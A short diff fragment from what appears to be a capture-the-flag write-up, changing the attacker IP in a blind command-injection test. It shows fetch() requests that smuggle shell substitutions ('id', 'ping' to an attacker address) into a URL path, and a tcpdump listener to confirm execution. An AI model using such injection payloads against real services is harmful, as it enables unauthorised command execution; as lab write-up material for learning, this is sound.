@@ -208,7 +208,7 @@ fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(id>&2)]")
 Nope, still can't see the output. Let's try to ping our own attack and check if we're getting pinged.
 
 ```
-fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(ping -c 1 10.10.14.61)]")
+fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(ping -c 1 10.10.10.10)]")
 
 $ sudo tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
